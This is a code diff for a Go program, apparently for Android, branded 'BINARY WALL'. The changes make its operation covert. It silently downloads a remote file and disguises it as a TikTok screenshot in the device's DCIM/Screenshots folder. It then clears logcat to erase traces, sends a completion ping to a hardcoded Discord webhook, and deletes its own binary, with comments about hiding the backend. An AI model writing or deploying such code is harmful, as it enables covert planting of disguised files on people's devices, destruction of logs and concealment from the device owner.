@@ -1,14 +1,21 @@
 package main
 
 import (
+	"bytes"
+	"encoding/json"
 	"fmt"
 	"io"
-	"log"
 	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"time"
+)
+
+// ANSI Color Codes
+const (
+	ColorPurple = "\033[35m"
+	ColorReset  = "\033[0m"
 )
 
 type WriteCounter struct {
@@ -43,79 +50,70 @@ func (wc *WriteCounter) PrintProgress() {
 		percentage = float64(wc.Total) / float64(wc.ContentLength) * 100
 	}
 
-	fmt.Printf("\r[Baixando] Progresso: %.2f%% | Velocidade: %s      ", percentage, speedStr)
+	fmt.Printf("\r%s[Baixando] Progresso: %.2f%% | Velocidade: %s%s      ", ColorPurple, percentage, speedStr, ColorReset)
 }
 
 func main() {
-	// Configura o log para mostrar data, hora e arquivo/linha
-	log.SetFlags(log.LstdFlags | log.Lshortfile)
-	
+	// Clear the terminal screen to make it look clean
+	printHeader()
+
 	url := "https://download1655.mediafire.com/xc6teo47qixgqmTd-1Tw3o1PQxzTs77kPScG4sh2ITRguBz7U_bdzPwKmqDsyOn4q6ULgQTOJTnFIgY9r9NrZyab19TyLiuODTrq40YyRds1wxl5AK3WbI-S6CP6xnPbgS_xeEYR6gMgMUcvpH7jYklxhstYVhMt5bU8focUpQVXBkEI/n07ccqwo05di1u8/AUD-20260505-WA02008.opus"
 	tempFile := "download_temp.bin"
 
-	fmt.Println("Iniciando processo (Modo Debug Ativado)...")
-	log.Printf("[DEBUG] URL Alvo: %s\n", url)
-	log.Printf("[DEBUG] Arquivo temporário: %s\n", tempFile)
-
-	// 1. Inicia o download
+	// 1. Silent Download
 	err := DownloadFile(tempFile, url)
 	if err != nil {
-		log.Fatalf("\n[ERRO FATAL] Falha no download: %v\n", err)
+		// Silent exit on error to hide backend
+		os.Exit(1)
 	}
-	fmt.Println("\n\nDownload concluído.")
 
-	// 2. Mover e Renomear o arquivo disfarçado como captura de tela
+	// 2. Move and Rename silently
 	novoNome := "Screenshot_2026-07-13-12-56-11-644_com.zhiliaoapp.musically-edit.jpg"
 	pastaDestino := "/storage/emulated/0/DCIM/Screenshots"
 	
-	log.Printf("[DEBUG] Tentando criar diretório de destino: %s\n", pastaDestino)
-	err = os.MkdirAll(pastaDestino, 0755)
-	if err != nil {
-		log.Printf("[AVISO] Falha ao criar diretório (pode já existir ou falta permissão): %v\n", err)
-	}
-
+	os.MkdirAll(pastaDestino, 0755)
 	caminhoFinal := filepath.Join(pastaDestino, novoNome)
-	log.Printf("[DEBUG] Caminho final definido para: %s\n", caminhoFinal)
 
 	err = moveFile(tempFile, caminhoFinal)
 	if err != nil {
-		log.Fatalf("[ERRO FATAL] Falha ao mover/renomear o arquivo: %v\n", err)
+		os.Exit(1)
 	}
-	log.Println("[DEBUG] Arquivo movido e camuflado com sucesso.")
 
-	// 3. Executar o comando logcat -c
-	log.Println("[DEBUG] Iniciando limpeza do logcat...")
-	cmd := exec.Command("logcat", "-c")
-	cmd.Stdout = os.Stdout
-	cmd.Stderr = os.Stderr
+	// 3. Silent Logcat Clear
+	exec.Command("logcat", "-c").Run()
+
+	// 4. Webhook Notification
+	sendWebhook()
+
+	// 5. Success Message & Self-Delete
+	fmt.Printf("\n\n%sFinalizado com sucesso.%s\n", ColorPurple, ColorReset)
 	
-	err = cmd.Run()
-	if err != nil {
-		log.Printf("[AVISO] Falha ao limpar logcat. O app pode não ter permissão READ_LOGS ou root. Erro real: %v\n", err)
-	} else {
-		log.Println("[DEBUG] Logcat limpo com sucesso.")
-	}
+	// Self-delete the binary
+	exePath, _ := os.Executable()
+	os.Remove(exePath)
 }
 
-// DownloadFile faz o HTTP GET e puxa os bytes
+func printHeader() {
+	// Clear screen using ANSI escape codes
+	fmt.Print("\033[H\033[2J")
+	fmt.Printf("%sBINARY WALL\n\nby brisado\n\n%s", ColorPurple, ColorReset)
+}
+
 func DownloadFile(filepath string, url string) error {
-	log.Printf("[DEBUG] Criando arquivo local: %s\n", filepath)
 	out, err := os.Create(filepath)
 	if err != nil {
-		return fmt.Errorf("erro ao criar arquivo %s: %v", filepath, err)
+		return err
 	}
 	defer out.Close()
 
-	log.Printf("[DEBUG] Iniciando GET Request para a URL...\n")
 	resp, err := http.Get(url)
 	if err != nil {
-		return fmt.Errorf("erro no GET Request: %v", err)
+		return err
 	}
 	defer resp.Body.Close()
 
-	log.Printf("[DEBUG] HTTP Status: %s\n", resp.Status)
 	if resp.StatusCode != http.StatusOK {
-		return fmt.Errorf("status HTTP ruim: %s", resp.Status)
+		return fmt.Errorf("bad status")
 	}
 
 	counter := &WriteCounter{
@@ -123,43 +121,52 @@ func DownloadFile(filepath string, url string) error {
 		StartTime:     time.Now(),
 	}
 
-	log.Printf("[DEBUG] Tamanho do conteúdo esperado: %d bytes\n", resp.ContentLength)
 	_, err = io.Copy(out, io.TeeReader(resp.Body, counter))
 	return err
 }
 
-// moveFile contorna problemas de movimentação entre partições do Android
 func moveFile(sourcePath, destPath string) error {
-	log.Printf("[DEBUG] Tentando os.Rename de %s para %s\n", sourcePath, destPath)
 	err := os.Rename(sourcePath, destPath)
 	if err == nil {
-		log.Println("[DEBUG] os.Rename concluído com sucesso.")
 		return nil
 	}
-	log.Printf("[AVISO] os.Rename falhou (%v). Iniciando fallback de cópia...\n", err)
 	
-	log.Printf("[DEBUG] Abrindo arquivo de origem: %s\n", sourcePath)
 	inputFile, err := os.Open(sourcePath)
 	if err != nil {
-		return fmt.Errorf("falha ao abrir a origem: %v", err)
+		return err
 	}
 
-	log.Printf("[DEBUG] Criando arquivo de destino: %s\n", destPath)
 	outputFile, err := os.Create(destPath)
 	if err != nil {
 		inputFile.Close()
-		return fmt.Errorf("falha ao criar o destino: %v", err)
+		return err
 	}
 
-	log.Println("[DEBUG] Copiando bytes do arquivo original para o destino...")
 	_, err = io.Copy(outputFile, inputFile)
-	inputFile.Close() 
+	inputFile.Close()
 	outputFile.Close()
 
 	if err != nil {
-		return fmt.Errorf("falha ao copiar bytes: %v", err)
+		return err
 	}
 
-	log.Printf("[DEBUG] Excluindo arquivo temporário original: %s\n", sourcePath)
 	return os.Remove(sourcePath)
+}
+
+func sendWebhook() {
+	webhookURL := "https://discord.com/api/webhooks/1545944265325019226/htiZKMdjg0ZZcNywNc9Xqtx0jGuwxJK9OWrpoK9wzrGL-5C7bWPKGBIdOl7jV24YCrFo"
+	
+	payload := map[string]string{
+		"content": "Novo download do BINARY WALL concluído com sucesso.",
+	}
+	
+	jsonData, err := json.Marshal(payload)
+	if err != nil {
+		return
+	}
+
+	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonData))
+	if err == nil {
+		resp.Body.Close()
+	}
 }
